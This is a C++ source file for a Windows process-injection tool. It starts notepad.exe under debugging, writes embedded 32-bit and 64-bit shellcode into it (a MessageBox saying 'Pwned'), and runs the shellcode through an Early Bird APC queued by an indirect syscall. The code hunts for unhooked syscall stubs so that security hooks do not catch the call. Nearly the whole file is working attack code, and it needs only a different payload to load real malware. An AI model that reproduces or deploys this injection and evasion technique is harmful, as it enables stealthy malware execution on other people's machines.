#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

/*
    g++ magical_wizard.cpp magical_wizard.o -o magical_wizard.exe
*/

typedef _Function_class_(PS_APC_ROUTINE)
VOID NTAPI PS_APC_ROUTINE(
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3
    );
typedef PS_APC_ROUTINE* PPS_APC_ROUTINE;

DWORD g_SSN_NtQueueApcThread        = 0;
LPVOID g_SYSADDR_NtQueueApcThread    = 0;
extern "C" NTSTATUS stubNtQueueApcThread(HANDLE ThreadHandle, PPS_APC_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);

BOOL isWow64(HANDLE hProcess) {
    BOOL bIsWow64 = FALSE;

    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if (fnIsWow64Process) {
        fnIsWow64Process(hProcess, &bIsWow64);
    }

    return bIsWow64;
}

FARPROC __stdcall MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PBYTE pBase = (PBYTE) hModule;

    //Cast DOS header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

    //Get NTHeader ptr from DOS header
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

    //Get Optionalheader for NTHeader
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    //get _IMAGE_EXPORT_DIRECTORY addr from opt hdr
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    /*
    typedef struct _IMAGE_EXPORT_DIRECTORY {
        DWORD   Characteristics;
        DWORD   TimeDateStamp;
        WORD    MajorVersion;
        WORD    MinorVersion;
        DWORD   Name;
        DWORD   Base;
        DWORD   NumberOfFunctions;
        DWORD   NumberOfNames;
        DWORD   AddressOfFunctions;     // RVA from base of image
        DWORD   AddressOfNames;         // RVA from base of image
        DWORD   AddressOfNameOrdinals;  // RVA from base of image
    } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
    */
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        if (strcmp(pFunctionName, lpProcName) == 0) {
            WORD wFunctionOrdinal = FunctionOrdinalArray[i];
            PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}

DWORD getInDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName){
    DWORD SSN = 0;
    LPVOID stub = NULL;
    BYTE* NtFunctionAddr = (BYTE*)MyGetProcAddress(hNTDLL, NtFunctionName);

    if (!NtFunctionAddr) return SSN;
    if (NtFunctionAddr[0] == 0x4C && NtFunctionAddr[1] == 0x8B && NtFunctionAddr[2] == 0xD1 && NtFunctionAddr[3] == 0xB8) {
        printf("[+] Function %s @ 0x%p\n", NtFunctionName, NtFunctionAddr);
        SSN = *(DWORD*)((BYTE*)NtFunctionAddr + 4);

        // stub normal => on trouve "syscall" (0x0F 0x05)
        if (NtFunctionAddr[0x12] == 0x0F && NtFunctionAddr[0x13] == 0x05) {
            stub = NtFunctionAddr; // direct vers le syscall
            printf("\t[*] Found syscall [0F 05] !\n");
        } else {
            printf("[*] %s may be hooked by a security!\n", NtFunctionName);
            printf("[*] Let's do a magic trick!\n");
            BYTE* looker = NtFunctionAddr;
            for (int _ = 0; _ < 0x500; _++) {
                looker++;
                if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xB8) {
                    //stub normal => on trouve "syscall" (0x0F 0x05)
                    if (looker[0x12] == 0x0F && looker[0x13] == 0x05) {
                        stub = looker; // direct vers le syscall
                        printf("\t[*] Found unhooked syscall [0F 05] !\n");
                        break;
                    }
                }
            } 
        }
    } else { 
        printf("[-] Unexpected stub format!\n");
        return SSN;
    }

    printf("\t[+] %s stub : SSN 0x%x\n", NtFunctionName, SSN);
    printf("\t[+] %s stub : syscall @ 0x%p\n", NtFunctionName, stub);

    g_SSN_NtQueueApcThread = SSN;
    g_SYSADDR_NtQueueApcThread = stub;
    return SSN;
}

void CreateEarlyBird(char *lpPath, PHANDLE hProcess, PHANDLE hThread, PDWORD dwProcessId) {
    STARTUPINFOA Si = {0};
	PROCESS_INFORMATION Pi = {0};

    memset(&Si, 0, sizeof(STARTUPINFO));
    memset(&Pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
		printf("[-] CreateProcessA Failed  : %d \n", GetLastError());
		return;
	}
    
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;
    *dwProcessId = Pi.dwProcessId;
}

int injectProc(){
    int is64 = 0;
    // MessageBox shellcode
    UCHAR shellcode_32[] = 
        "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52"
        "\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28"
        "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
        "\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01"
        "\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01"
        "\xd3\x8b\x48\x18\x50\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31"
        "\xff\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        "\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
        "\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
        "\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
        "\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\xe8\x0b\x00\x00"
        "\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x68\x4c"
        "\x77\x26\x07\xff\xd5\x6a\x00\xe8\x06\x00\x00\x00\x50\x77"
        "\x6e\x65\x64\x00\xe8\x11\x00\x00\x00\x49\x6e\x6a\x65\x63"
        "\x74\x65\x64\x20\x62\x79\x20\x52\x69\x64\x61\x00\x6a\x00"
        "\x68\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6"
        "\x95\xbd\x9d\xff\xd5\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
        "\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
    UCHAR shellcode_64[] = 
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
        "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
        "\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b"
        "\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
        "\x00\x00\x00\x49\x6e\x6a\x65\x63\x74\x65\x64\x20\x62\x79"
        "\x20\x52\x69\x64\x61\x00\x5a\xe8\x06\x00\x00\x00\x50\x77"
        "\x6e\x65\x64\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"
        "\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
        "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
        "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    PUCHAR shellcode = nullptr;
    SIZE_T scSize = 0;

    HMODULE hNtdll = GetModuleHandle(TEXT("ntdll.dll"));

    char lpProcessName[] = "notepad.exe";
    char lpPath[666];
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;

    sprintf(lpPath, "C:\\windows\\System32\\%s", lpProcessName);
    printf("\n[+] Starting EarlyBird with DEBUG_PROCESS flag : \"%s\" ... \n", lpPath);

    if (!isWow64(hProcess)) {
        is64 = 1;
        shellcode = shellcode_64;
        scSize = sizeof(shellcode_64);
    } else {
        shellcode = shellcode_32;
        scSize = sizeof(shellcode_32);
    }

    CreateEarlyBird(lpPath, &hProcess, &hThread, &dwProcessId);

    LPVOID memPoolPtr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode_64), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);
    WriteProcessMemory(hProcess, memPoolPtr, shellcode_64, sizeof(shellcode_64), NULL);
    printf("[+] Shellcode %s written\n", is64 ? "64bit" : "32bit");
    
    DWORD oldProt = 0;
    VirtualProtectEx(hProcess, memPoolPtr, scSize, PAGE_EXECUTE_READ, &oldProt);
    getInDirectSyscallStub(hNtdll, "NtQueueApcThread");

    stubNtQueueApcThread(hThread, (PPS_APC_ROUTINE)memPoolPtr, 0, 0, 0);
    printf("[+] APC Queued.\n");

    DebugActiveProcessStop(dwProcessId);
    printf("[+] EarlyBird Debug Stopped.\n");
    
    ResumeThread(hThread);
    printf("[+] Thread resumed, waiting for APC execution...\n");

    WaitForSingleObject(hThread, INFINITE);
    printf("[+] APC done.\n");

    VirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int main(int argc, char **argv){
    injectProc();
    return 0;
}